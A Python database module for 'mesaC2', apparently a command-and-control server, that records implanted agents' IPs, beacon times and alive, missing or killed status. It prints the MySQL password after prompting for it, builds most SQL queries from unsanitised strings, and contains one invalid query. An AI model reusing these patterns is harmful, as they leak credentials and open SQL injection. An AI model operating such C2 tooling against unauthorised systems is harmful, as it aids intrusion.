import mysql.connector
import datetime
import getpass

from termcolor import colored


class DB:
    def __init__(self):
        print("Setting up DB...")
        print(colored("Make sure MySQL Server is running.", "yellow"))
        username = input("Enter MySQL username: ") 
        password = getpass.getpass(prompt="Enter MySQL password: ")
        print(password)
        self.mydb = mysql.connector.connect(
            host="localhost",
            user=username,
            password=password,
            auth_plugin='mysql_native_password'
        )

        self.mycursor = self.mydb.cursor(buffered=True)

        self.mycursor.execute("create database if not exists mesaC2")  # create msql db

        self.mycursor.execute("use mesaC2")

        self.mycursor.execute("create table if not exists agents("
                                "agentID varchar(16) not null primary key,"
                                "os varchar(255) null,"
                                "service varchar(255) null,"
                                "status varchar(10) not null default \'ALIVE\',"
                                "pingtimestamp timestamp null)")

        
        #for large entries testing
        # for i in range(1, 50):
        #     ip = "10.5.6." + str(i)
        #     sqlcmd = ("insert into agents (agentid, pingtimestamp) values (%s, %s)")
        #     values = (ip, "2021-04-03 12:49:31")

        #     self.mycursor.execute(sqlcmd, values)
        #     self.mydb.commit()

    # DB MODS
    def addAgent(self, ip, timestamp, status):  # INTERNAL, when receive first (setup) ping
        sqlcmd = "insert into agents (agentID, pingtimestamp, status) values (%s, %s, %s)"
        values = (str(ip), str(timestamp), status)

        self.mycursor.execute(sqlcmd, values)
        self.mydb.commit()

        print(colored(f"\n\n[+] Agent {ip} added!\n", "green"))

    def deleteAgent(self, ip):  # INTERNAL, for kill command
        self.mycursor.execute(f"delete from agents where agentID=\'{ip}\'")

        self.mydb.commit()
        print(colored(f"[*] Agent {ip} deleted!\n", "yellow"))

    def dbPull(self):  # PUBLIC
        self.checkStatus()

        self.mycursor.execute("select * from agents order by isnull(service), service asc")
        return self.mycursor.fetchall()

    def pullSpecific(self, grouping, value):  # INTERNAL, use this when sending group commands?
        self.checkStatus()

        self.mycursor.execute(f"select * from agents where {grouping}=\'{value}\'")
        return self.mycursor.fetchall()

    def addGrouping(self, ip, typ, grouping):  # PUBLIC
        ipArr = []
        lBracketCount = ip.count("[")
        rBracketCount = ip.count("]")
        colonCount = ip.count(":")

        if lBracketCount == 1 and rBracketCount == 1 and colonCount == 1:
            lbl = ip.find(".[")
            rbl = ip.find("]")
            cl = ip.find(":")
            low = int(ip[lbl+2:cl])
            high = int(ip[cl+1:rbl])

            for i in range(low, high+1):
                template = ip[0:lbl+1]
                template += str(i)
                template += ip[rbl+1:]
                ipArr.append(template)

        elif lBracketCount == 0 and rBracketCount == 0:
            ipArr.append(ip)
        else:
            return 
            
        for addr in ipArr:
            sqlcmd = f"update agents set {typ} = \'{grouping}\' where agentID = \'{addr}\'"
            self.mycursor.execute(sqlcmd)
            self.mydb.commit()

            print(colored(f"[+] Identifier \"{grouping}\" added to Agent {addr}!\n", "green"))



    def removeAllAgents(self):  # PUBLIC, removes all agents
        self.mycursor.execute("delete from agents")

        self.mydb.commit()
        print(colored("[*] All agents removed!\n", "yellow"))


    def updateTimestamp(self, tstamp, agent):  # INTERNAL, updates on resync request
        sqlcmd = "insert into agents (pingtimestamp) values (%s) where agentID=\'%s\'"
        values = (tstamp, agent)

        self.mycursor.execute(sqlcmd, values)
        self.mydb.commit()


    def describe(self):
        self.mycursor.execute("desc agents")
        for value in self.mycursor.fetchall():
            print(value)
        print("")


    # STATUS CHECKS
    def missingStatus(self, ip):  # INTERNAL, after 3 pings missed (timestamp+3min)
        self.mycursor.execute("update agents "
                            "set status = \'MIA\'"
                            f"where agentID =\'{ip}\'")

        self.mydb.commit()
        # print(colored(f" Agent {ip} is MIA!\n", "yellow")) 


    def deadStatus(self, ip):  # PUBLIC, after agent killed
        sqlcmd = "update agents set status=%s where agentid=%s"
        val = ("SRV-KILLED", str(ip))
        self.mycursor.execute(sqlcmd, val)

        self.mydb.commit()


        #print(colored(f" Agent {ip} is dead!\n", "red")) 


    def aliveStatus(self, ip, timestamp):  # INTERNAL, after receiving beacon
        self.mycursor.execute(f"select agentID from agents where agentID = \'{ip}\'")
        resp = self.mycursor.fetchall()
        if len(resp) == 0:
            self.addAgent(ip, timestamp, "ALIVE")
        else:
            self.mycursor.execute("update agents "
                                f"set status = \'ALIVE\',pingtimestamp=\'{timestamp}\' "
                                f"where agentID = \'{ip}\'")

            self.mydb.commit()

        #print(colored(f" \nPing from agent {ip}!\n", "green")) 


    def checkStatus(self):  # internal, called on each summon of the table
        tscurrent = datetime.datetime.now()
        strcurrent = "{:%Y-%m-%d %H:%M:%S}".format(tscurrent)

        t2 = datetime.datetime.strptime(strcurrent, "%Y-%m-%d %H:%M:%S")

        self.mycursor.execute("select pingtimestamp,agentID,status from agents")
        data = self.mycursor.fetchall()
        if len(data) == 0:
            return  # skip if no agents in table

        for entry in data:
            check = "{:%Y-%m-%d %H:%M:%S}".format(entry[0])  # %Y-%m-%d %H:%M:%S
            t1 = datetime.datetime.strptime(check, "%Y-%m-%d %H:%M:%S")  

            difference = t2 - t1

            if difference.seconds / 60 > 3.0 and entry[2] != "SRV-KILLED":
                self.missingStatus(entry[1])


    def cleanDB(self):  # EXTERNAL, called on 'shutdown'
        self.removeAllAgents()
        self.mycursor.execute("drop table agents")
        self.mydb.commit()
        print(colored("\n[*] Dropping agents table...", "yellow"))
        self.mycursor.execute("drop database mesaC2")
        self.mydb.commit()
        print(colored("\n[*] Deleting database mesaC2...\n", "yellow"))